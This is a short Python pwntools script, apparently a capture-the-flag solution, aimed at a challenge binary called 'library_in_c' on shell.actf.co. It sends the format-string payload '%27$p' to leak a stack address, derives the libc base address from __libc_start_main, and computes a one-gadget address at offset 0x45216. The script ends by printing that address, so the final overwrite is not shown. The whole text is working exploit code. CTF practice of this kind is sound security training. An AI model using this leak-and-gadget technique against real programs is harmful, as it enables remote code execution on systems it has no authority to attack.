from pwn import *

payload = '%27$p'
elf = ELF('./library_in_c')
p = remote('shell.actf.co',20201)
libc = ELF('libc.so.6')
print p.recvuntil('What is your name?')
p.sendline(payload)
p.recvline()
a = p.recvline()
libc.address = int(a.split()[3],16)-243-libc.sym['__libc_start_main']
exe = libc.address+0x45216
print hex(exe)
